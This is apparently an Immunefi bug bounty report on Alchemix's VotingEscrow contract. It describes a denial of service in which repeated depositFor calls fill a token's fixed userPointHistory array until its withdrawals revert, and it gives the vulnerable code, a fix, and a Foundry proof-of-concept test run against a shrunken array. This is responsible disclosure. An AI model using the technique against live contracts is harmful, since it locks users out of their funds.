# 30922 - \[SC - High] DOS of withdrawals through filling the userPoin...

Submitted on May 8th 2024 at 07:48:35 UTC by @NinetyNineCrits for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30922

Report type: Smart Contract

Report severity: High

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

While not very feasible, it is technically possible to DOS withdraws associated with a tokenId, by doing a large amount of deposits for said tokenId.

## Vulnerability Details

Unlike Velodrome, every `_checkpoint` call with an associated tokenId writes a new userPoint:

```solidity
    uint256 userEpoch = userPointEpoch[_tokenId] + 1;

    userPointEpoch[_tokenId] = userEpoch;
    newPoint.ts = block.timestamp;
    newPoint.blk = block.number;
    userPointHistory[_tokenId][userEpoch] = newPoint;
```

This opens up the door to a DOS, as the number of possible user points is limited:

```solidity
mapping(uint256 => Point[1000000000]) public userPointHistory;
```

Any user can invoke `_checkpoint` for any tokenId by using `depositFor`.

Naturally 1 Billion is a very large number that somewhats limits the feasability and likelihood of this attack (but does not mean a billion transactions need to be made, as the deposits could be looped through a contract). Even though the impact could be categorized as a `permanent freeze`, the limitations do not justify a higher severity than medium imo, hence `griefing` seems to be the appropriate impact.

## Impact Details

DOS of any tokenId, but associated with very high costs of attack.

## Recommendations

Consider going back to Velodromes approach of accounting, which limits the addition of points to 1 per block:

```solidity
uint256 userEpoch = userPointEpoch[_tokenId];
if (userEpoch != 0 && _userPointHistory[_tokenId][userEpoch].ts == block.timestamp) {
    _userPointHistory[_tokenId][userEpoch] = uNew;
} else {
    userPointEpoch[_tokenId] = ++userEpoch;
    _userPointHistory[_tokenId][userEpoch] = uNew;
}
```

This would also add a time constraint on the attack, which would require 380 years, assuming a a block each 12 seconds.

## Proof of Concept

```solidity
    //@note requires modifying `mapping(uint256 => Point[1000000000]) public userPointHistory;` in VotingEscrow to a size of 5
    function testMinhDOSWithdraw() public {
        address user = address(0x12345);
        address attacker = address(0x6789);
        deal(bpt, user, 10e18);
        deal(bpt, attacker, 10);

        hevm.startPrank(user);
        IERC20(bpt).approve(address(veALCX), 10e18);
        uint256 tokenId = veALCX.createLock(10e18, 2 weeks, false);
        hevm.stopPrank();

        hevm.startPrank(attacker);
        IERC20(bpt).approve(address(veALCX), 10);
        veALCX.depositFor(tokenId, 1);
        veALCX.depositFor(tokenId, 1);
        veALCX.depositFor(tokenId, 1);
        hevm.stopPrank();

        hevm.warp(block.timestamp + 2 weeks);

        hevm.startPrank(user);
        veALCX.startCooldown(tokenId);

        hevm.warp(block.timestamp + 2 weeks);

        veALCX.withdraw(tokenId);
    }
```

This test will revert on the `withdraw` call with:

```solidity
[FAIL. Reason: Index out of bounds]
```
